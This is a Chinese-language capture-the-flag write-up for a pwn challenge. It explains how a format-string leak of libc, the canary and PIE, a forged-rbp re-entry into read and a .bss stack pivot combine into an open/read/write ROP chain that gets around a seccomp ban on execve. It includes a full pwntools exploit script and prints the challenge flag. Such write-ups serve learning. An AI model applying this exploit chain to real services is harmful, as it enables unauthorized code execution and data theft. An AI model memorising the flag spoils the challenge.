# 结束了？

## 题目简述

程序先把最多 16 字节的姓名直接交给 `printf(input)`，随后又向 0x38 字节栈缓冲区读取 0x50 字节简介。实际附件为 Full RELRO、Canary、NX、PIE；seccomp 禁止 `execve`、`execveat`，所以需要先用格式化字符串泄露 libc、Canary 和 PIE，再利用只能覆盖到一个返回地址的短溢出反复调用 `read`、迁移到 `.bss`，最后执行 ORW。

## 解题过程

### 一次泄露三个基址信息

16 字节恰好可以放入：

```text
%8$p.%13$p.%9$p.
```

对仓库附件与配套 `libc.so.6`，三个值依次对应：

- libc 内地址，距基址偏移 `0x1f12e8`；
- 栈 Canary；
- ELF 中 `__libc_csu_init`，偏移 `0x14c0`。

因此可计算两个加载基址，并保留 Canary 通过函数尾部检查。解析时应使用 `int(value, 16)`，不需要对远端文本调用 `eval`。

### 利用短溢出获得第二次读入

简介缓冲区到 Canary 的距离为 `0x38`，后面依次是 Canary、保存的 `rbp` 和返回地址，0x50 字节读入只能刚好覆盖到返回地址。把保存的 `rbp` 改成 `.bss + 0x40`，返回到 `main+0x7a`（即偏移 `0x148d` 的第二次 `read` 设置位置），程序就会向 `.bss` 再读 0x50 字节。

这 0x50 字节同时满足两种用途：

1. `.bss+0x38` 放正确 Canary，使重入后的检查通过；
2. 两次 `leave; ret` 把栈迁移到 `.bss`，先调用 `read(0, .bss, 0x1000)` 装入完整 ROP 链。

随后用配套 libc 的 gadget 显式设置参数，执行 `open("flag",0)`、`read(3,buf,0x100)`、`write(1,buf,0x100)`。

```python
import time

from pwn import *

context.arch = "amd64"
context.os = "linux"

elf = context.binary = ELF(args.BIN or "./ret2libc-revenge", checksec=False)
libc = ELF(args.LIBC or "./libc.so.6", checksec=False)

if not args.HOST or not args.PORT:
    raise SystemExit(
        "usage: python exp.py BIN=./ret2libc-revenge "
        "LIBC=./libc.so.6 HOST=<host> PORT=<port>"
    )
io = remote(args.HOST, int(args.PORT))

# 第一阶段：格式化字符串泄露。
io.sendafter(b"name:\n", b"%8$p.%13$p.%9$p.")
leak_text = io.recvuntil(b"A good name!", drop=True)
libc_leak, canary, pie_leak = [
    int(value, 16) for value in leak_text.split(b".")[:3]
]

libc.address = libc_leak - 0x1F12E8
elf.address = pie_leak - elf.symbols["__libc_csu_init"]

log.success(f"libc = {libc.address:#x}")
log.success(f"PIE = {elf.address:#x}")
log.success(f"canary = {canary:#x}")

rop = ROP(libc)
pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
pop_rsi = rop.find_gadget(["pop rsi", "ret"]).address
pop_rdx = rop.find_gadget(["pop rdx", "ret"]).address
leave_ret = rop.find_gadget(["leave", "ret"]).address
ret = rop.find_gadget(["ret"]).address

staging = elf.bss() + 0x400
read_again = elf.address + 0x148D

# 0x50 字节短溢出：改 rbp，并重新进入第二次 read。
short_overflow = flat(
    b"A" * 0x38,
    canary,
    staging + 0x40,
    read_again,
)
io.sendafter(b"intro:\n", short_overflow)

# 重入 read 写入的 0x50 字节；Canary 必须位于 staging+0x38。
pivot = flat(
    staging + 0x40,  # 第二次 leave 时弹入 rbp
    pop_rdx,
    0x1000,
    libc.symbols["read"],
    ret,
    ret,
    ret,
    canary,
    staging,
    leave_ret,
)
assert len(pivot) == 0x50
io.send(pivot)

# 上一条 read 返回时 rsp 指向 staging+0x20，所以前四项作为对齐占位。
path_address = staging + 0x300
buffer_address = staging + 0x400
orw = flat(
    [ret] * 4,
    pop_rdi, path_address,
    pop_rsi, 0,
    pop_rdx, 0,
    libc.symbols["open"],
    pop_rdi, 3,
    pop_rsi, buffer_address,
    pop_rdx, 0x100,
    libc.symbols["read"],
    pop_rdi, 1,
    pop_rsi, buffer_address,
    pop_rdx, 0x100,
    libc.symbols["write"],
)
orw = orw.ljust(0x300, b"\x00") + b"flag\x00"

time.sleep(0.1)
io.send(orw)
io.interactive()
```

仓库 `build.sh` 中给出的题目 flag 为：

```text
0xGame{N0_0n3_c4n_sTop_my_R0P!_19d92hab}
```

## 方法总结

该题把多个受限原语串成完整利用链：16 字节格式化字符串同时泄露三项随机化信息；0x50 字节栈溢出只能控制一个返回地址，于是通过伪造 `rbp` 重入 `read`；第二次读入再用双 `leave; ret` 迁移到 `.bss`，最终构造 ORW 绕过 seccomp。源码注释中的 `-fno-stack-protector -no-pie` 与实际编译命令、附件保护不一致，应以实际 ELF 为准。
